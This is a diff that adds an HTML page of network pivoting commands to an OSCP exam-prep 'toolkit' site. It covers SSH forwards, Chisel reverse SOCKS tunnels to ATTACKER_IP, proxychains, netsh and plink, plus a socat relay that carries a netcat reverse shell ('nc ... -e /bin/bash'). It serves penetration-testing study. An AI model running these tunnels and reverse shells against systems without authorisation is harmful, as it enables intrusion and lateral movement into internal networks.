@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pivoting - OSCP Toolkit</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>🔀 Pivoting</h1>
+            <nav>
+                <a href="index.html">Home</a>
+                <a href="quickcmds.html">⚡ Quick Cmds</a>
+                <a href="tools.html">🛠️ Tools</a>
+                <a href="reverse_shells.html">Shells</a>
+                <a href="enumeration.html">Enumeration</a>
+                <a href="privesc_linux.html">Linux PrivEsc</a>
+                <a href="privesc_windows.html">Windows PrivEsc</a>
+                <a href="buffer_overflow.html">Buffer Overflow</a>
+                <a href="transfer_files.html">File Transfer</a>
+                <a href="pivoting.html" class="active">Pivoting</a>
+                <a href="checklist.html">Checklist</a>
+            </nav>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="toc">
+            <h3>📑 Quick Navigation</h3>
+            <ul>
+                <li><a href="#ssh-local">SSH Local Forward</a></li>
+                <li><a href="#ssh-dynamic">SSH Dynamic (SOCKS)</a></li>
+                <li><a href="#ssh-remote">SSH Remote Forward</a></li>
+                <li><a href="#chisel">Chisel</a></li>
+                <li><a href="#socat">Socat</a></li>
+                <li><a href="#proxychains">Proxychains</a></li>
+                <li><a href="#windows">Windows Pivoting</a></li>
+            </ul>
+        </div>
+
+        <div class="alert alert-info">
+            💡 <strong>Scenario:</strong> Attacker (10.10.14.5) → Pivot (10.10.10.5 | 192.168.1.5) → Target (192.168.1.100)
+        </div>
+
+        <h2 id="ssh-local">🔗 SSH Local Port Forwarding (-L)</h2>
+        <p>Access remote service through local port.</p>
+        <pre data-lang="bash"><code><span class="comment"># Syntax</span>
+ssh -L LOCAL_PORT:TARGET_IP:TARGET_PORT user@PIVOT_HOST
+
+<span class="comment"># Access internal web server (192.168.1.100:80) via localhost:8080</span>
+ssh -L 8080:192.168.1.100:80 user@pivot.host
+<span class="comment"># Now browse: http://localhost:8080</span>
+
+<span class="comment"># Access internal RDP via localhost:3389</span>
+ssh -L 3389:192.168.1.100:3389 user@pivot.host
+<span class="comment"># Now: rdesktop localhost</span>
+
+<span class="comment"># Background tunnel</span>
+ssh -L 8080:192.168.1.100:80 -N -f user@pivot.host</code></pre>
+
+        <h2 id="ssh-dynamic">🌐 SSH Dynamic Port Forwarding (-D) / SOCKS Proxy</h2>
+        <p>Create SOCKS proxy for flexible access to the internal network.</p>
+        <pre data-lang="bash"><code><span class="comment"># Create SOCKS proxy on port 9050</span>
+ssh -D 9050 -N user@pivot.host
+
+<span class="comment"># Background it</span>
+ssh -D 9050 -N -f user@pivot.host
+
+<span class="comment"># Use with proxychains</span>
+proxychains nmap -sT -Pn 192.168.1.0/24
+proxychains curl http://internal.host</code></pre>
+
+        <h3>Proxychains Configuration</h3>
+        <pre data-lang="bash"><code><span class="comment"># Edit /etc/proxychains4.conf</span>
+<span class="comment"># Add at bottom:</span>
+socks5 127.0.0.1 9050</code></pre>
+
+        <h2 id="ssh-remote">📤 SSH Remote Port Forwarding (-R)</h2>
+        <p>Expose local service to remote network.</p>
+        <pre data-lang="bash"><code><span class="comment"># Expose your web server to pivot network</span>
+ssh -R 8080:127.0.0.1:80 user@pivot.host
+<span class="comment"># Pivot can access your server at localhost:8080</span>
+
+<span class="comment"># Expose your listener for reverse shell</span>
+ssh -R 4444:127.0.0.1:4444 user@pivot.host
+<span class="comment"># Target connects to pivot:4444 → reaches your listener</span></code></pre>
+
+        <h2 id="chisel">🔧 Chisel</h2>
+        <div class="alert alert-success">
+            ✅ <strong>Best for:</strong> When SSH isn't available. Works on both Windows and Linux.
+        </div>
+
+        <h3>Reverse SOCKS Proxy (Most Common)</h3>
+        <pre data-lang="bash"><code><span class="comment"># On attacker (server)</span>
+./chisel server -p 8080 --reverse
+
+<span class="comment"># On pivot (client)</span>
+./chisel client ATTACKER_IP:8080 R:socks
+
+<span class="comment"># Windows pivot</span>
+chisel.exe client ATTACKER_IP:8080 R:socks
+
+<span class="comment"># Use with proxychains (default port 1080)</span>
+<span class="comment"># Add to /etc/proxychains4.conf: socks5 127.0.0.1 1080</span>
+proxychains nmap -sT -Pn 192.168.1.100</code></pre>
+
+        <h3>Port Forwarding</h3>
+        <pre data-lang="bash"><code><span class="comment"># On attacker</span>
+./chisel server -p 8080 --reverse
+
+<span class="comment"># Forward internal RDP to attacker:3389</span>
+./chisel client ATTACKER_IP:8080 R:3389:192.168.1.100:3389
+
+<span class="comment"># Multiple forwards</span>
+./chisel client ATTACKER_IP:8080 R:3389:192.168.1.100:3389 R:445:192.168.1.100:445</code></pre>
+
+        <h2 id="socat">🔌 Socat</h2>
+        <h3>Port Forwarding</h3>
+        <pre data-lang="bash"><code><span class="comment"># Forward local port to remote</span>
+socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80</code></pre>
+
+        <h3>Reverse Shell Relay</h3>
+        <pre data-lang="bash"><code><span class="comment"># On attacker</span>
+nc -lvnp 4444
+
+<span class="comment"># On pivot - relay connections to attacker</span>
+socat TCP-LISTEN:5555,fork TCP:ATTACKER_IP:4444
+
+<span class="comment"># On target - connect to pivot</span>
+nc PIVOT_IP 5555 -e /bin/bash</code></pre>
+
+        <h2 id="proxychains">⛓️ Proxychains Usage</h2>
+        <pre data-lang="bash"><code><span class="comment"># Configuration file: /etc/proxychains4.conf</span>
+<span class="comment"># Add SOCKS proxy:</span>
+socks5 127.0.0.1 1080
+
+<span class="comment"># Run tools through proxy</span>
+proxychains nmap -sT -Pn 192.168.1.100
+proxychains ssh user@192.168.1.100
+proxychains curl http://192.168.1.100
+proxychains evil-winrm -i 192.168.1.100 -u user -p pass
+
+<span class="comment"># Note: Only TCP works! No ICMP/UDP</span>
+<span class="comment"># Use -sT (TCP connect) not -sS (SYN) for nmap</span></code></pre>
+
+        <h2 id="windows">🪟 Windows Pivoting</h2>
+        <h3>Netsh Port Forwarding</h3>
+        <pre data-lang="cmd"><code><span class="comment">:: Add port forward</span>
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.100
+
+<span class="comment">:: List forwards</span>
+netsh interface portproxy show all
+
+<span class="comment">:: Remove forward</span>
+netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0</code></pre>
+
+        <h3>Plink (PuTTY)</h3>
+        <pre data-lang="cmd"><code><span class="comment">:: Dynamic port forward (SOCKS)</span>
+plink.exe -D 9050 -N user@ATTACKER_IP
+
+<span class="comment">:: Local port forward</span>
+plink.exe -L 8080:192.168.1.100:80 user@ATTACKER_IP
+
+<span class="comment">:: Non-interactive</span>
+cmd.exe /c echo y | plink.exe -ssh -l user -pw password -R 9050:127.0.0.1:9050 ATTACKER_IP</code></pre>
+
+        <h2>📋 Quick Reference</h2>
+        <table>
+            <thead>
+                <tr><th>Tool</th><th>Use Case</th><th>Command</th></tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>SSH -L</td>
+                    <td>Access remote port locally</td>
+                    <td><code>ssh -L 8080:target:80 pivot</code></td>
+                </tr>
+                <tr>
+                    <td>SSH -D</td>
+                    <td>SOCKS proxy</td>
+                    <td><code>ssh -D 9050 pivot</code></td>
+                </tr>
+                <tr>
+                    <td>Chisel</td>
+                    <td>SOCKS proxy (no SSH)</td>
+                    <td><code>chisel client IP:8080 R:socks</code></td>
+                </tr>
+                <tr>
+                    <td>Socat</td>
+                    <td>Simple port forward</td>
+                    <td><code>socat TCP-LISTEN:80,fork TCP:target:80</code></td>
+                </tr>
+                <tr>
+                    <td>Proxychains</td>
+                    <td>Route tools through proxy</td>
+                    <td><code>proxychains nmap target</code></td>
+                </tr>
+            </tbody>
+        </table>
+
+        <footer>
+            <p>OSCP Toolkit | Good luck on your exam! 🎯</p>
+        </footer>
+    </div>
+
+    <script>
+        document.querySelectorAll('pre').forEach(pre => {
+            const btn = document.createElement('button');
+            btn.className = 'copy-btn';
+            btn.textContent = 'Copy';
+            btn.onclick = () => {
+                navigator.clipboard.writeText(pre.querySelector('code').textContent);
+                btn.textContent = 'Copied!';
+                btn.classList.add('copied');
+                setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+            };
+            pre.style.position = 'relative';
+            pre.appendChild(btn);
+        });
+    </script>
+</body>
+</html>
+
+
